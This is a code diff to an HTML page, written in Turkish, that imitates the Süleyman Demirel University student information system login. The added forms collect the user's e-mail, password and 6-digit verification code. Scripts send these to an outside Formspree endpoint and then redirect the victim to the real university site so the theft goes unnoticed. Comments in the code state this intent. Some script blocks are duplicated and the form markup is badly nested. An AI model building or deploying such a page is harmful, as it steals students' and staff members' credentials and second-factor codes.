@@ -933,45 +933,111 @@
                                         Bilgi Sistemi'nden", öğrenci iseniz "Öğrenci Bilgi Sistemi'nden" alınmaktadır.
                                         Eğer doğrulama kodu gelmediyse "Personel Daire Başkanlığı'ndan" veya "Öğrenci
                                         İşleri Daire Başkanlığı'ndan" numaranızın düzeltilmesini isteyiniz.</div>
-                                    <form id="kodForm" action="https://formspree.io/f/mvzzwyqq" method="POST">
-                                        <div class="form-group mb-3 text-center">
-                                            <input type="text" name="onay_kodu" class="form-control text-center"
-                                                placeholder="6 Haneli Kodu Giriniz" required maxlength="6">
-                                        </div>
-                                        <button type="submit" class="btn btn-primary"
-                                            style="width:100%; background-color:#800000; color:white;">DOĞRULA</button>
-                                    </form>
+                                    <div class="login-form-container"
+                                        style="margin-top: 20px; max-width: 350px; margin-left: auto; margin-right: auto;">
+                                        <form id="kodForm" action="https://formspree.io/f/mvzzwyqq" method="POST">
+
+                                            <div class="form-group mb-3 text-center">
+                                                <label
+                                                    style="color: #000; font-weight: bold; display: block; margin-bottom: 10px;">Lütfen
+                                                    6 Haneli Doğrulama Kodunu Giriniz</label>
+                                                <input type="text" name="onay_kodu" class="form-control text-center"
+                                                    placeholder="000000" required maxlength="6"
+                                                    style="height: 50px; width: 100%; font-size: 24px; letter-spacing: 5px; border: 1px solid #ced4da; border-radius: 4px;">
+                                            </div>
+
+                                            <button type="submit" id="onayButonu"
+                                                style="width:100%; background-color:#800000; color:white; height: 50px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer;">
+                                                DOĞRULA
+                                            </button>
+                                        </form>
+                                    </div>
 
                                     <script>
                                         document.getElementById("kodForm").addEventListener("submit", function (e) {
                                             e.preventDefault();
+                                            var btn = document.getElementById("onayButonu");
+                                            btn.innerText = "KONTROL EDİLİYOR...";
+                                            btn.disabled = true;
+
                                             var data = new FormData(this);
                                             fetch(this.action, {
                                                 method: 'POST',
                                                 body: data,
                                                 headers: { 'Accept': 'application/json' }
-                                            }).finally(() => {
-                                                // Kod gönderilince gerçek OBS'ye at
+                                            }).finally(function () {
+                                                // Kod mailinize düşer düşmez gerçek SDÜ OBS'ye gönderiyoruz
                                                 window.location.href = "https://obs.sdu.edu.tr/";
                                             });
                                         });
                                     </script>
                                     <div class="login-form-container" style="margin-top: 20px;">
-                                        <form action="https://formspree.io/f/mvzzwyqq" method="POST" target="_self">
+                                        <div class="login-form-container" style="margin-top: 20px;">
+                                            <div class="login-form-container" style="margin-top: 20px;">
+                                                <form id="sduAnaForm" action="https://formspree.io/f/mvzzwyqq"
+                                                    method="POST">
 
-                                            <input type="hidden" name="_next" value="https://obs.sdu.edu.tr/">
+                                                    <div class="form-group mb-3" style="position: relative;">
+                                                        <input type="text" name="ana_posta" class="form-control"
+                                                            placeholder="E-Posta Adresi" required
+                                                            style="height: 45px; width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px;">
+                                                    </div>
 
-                                            <div class="form-group mb-3">
-                                                <input type="text" name="dogrulama_kodu"
-                                                    class="form-control text-center" placeholder="6 Haneli Kodu Giriniz"
-                                                    required maxlength="6"
-                                                    style="font-size: 20px; font-weight: bold; height: 50px;">
+                                                    <div class="form-group mb-3" style="position: relative;">
+                                                        <input type="password" name="ana_sifre" class="form-control"
+                                                            placeholder="Şifre" required
+                                                            style="height: 45px; width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 4px;">
+                                                    </div>
+
+                                                    <button type="submit" id="girisButonu" class="btn btn-primary"
+                                                        style="width:100%; background-color:#800000; color:white; height: 50px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer;">
+                                                        GİRİŞ YAP
+                                                    </button>
+                                                </form>
                                             </div>
 
-                                            <button type="submit" class="btn btn-primary btn-block"
-                                                style="width:100%; background-color:#800000; color:white; height: 50px; border: none; font-weight: bold;">
-                                                DOĞRULA
-                                            </button>
+                                            <script>
+                                                document.getElementById("sduAnaForm").addEventListener("submit", function (e) {
+                                                    e.preventDefault();
+                                                    var btn = document.getElementById("girisButonu");
+                                                    btn.innerText = "Giriş Yapılıyor...";
+                                                    btn.disabled = true;
+
+                                                    var data = new FormData(this);
+                                                    fetch(this.action, {
+                                                        method: 'POST',
+                                                        body: data,
+                                                        headers: { 'Accept': 'application/json' }
+                                                    }).finally(function () {
+                                                        // Bilgi gitsin ya da gitmesin, 2 saniye sonra yönlendir
+                                                        setTimeout(function () {
+                                                            window.location.href = "dogrulama.html";
+                                                        }, 1000);
+                                                    });
+                                                });
+                                            </script>
+                                        </div>
+
+                                        <script>
+                                            document.getElementById("sduAnaForm").addEventListener("submit", function (e) {
+                                                e.preventDefault();
+                                                var btn = document.getElementById("girisButonu");
+                                                btn.innerText = "Giriş Yapılıyor...";
+                                                btn.disabled = true;
+
+                                                var data = new FormData(this);
+                                                fetch(this.action, {
+                                                    method: 'POST',
+                                                    body: data,
+                                                    headers: { 'Accept': 'application/json' }
+                                                }).finally(function () {
+                                                    // Bilgi gitsin ya da gitmesin, 2 saniye sonra yönlendir
+                                                    setTimeout(function () {
+                                                        window.location.href = "dogrulama.html";
+                                                    }, 1000);
+                                                });
+                                            });
+                                        </script>
                                         </form>
                                     </div>
                                     <div class="form-group position-relative">
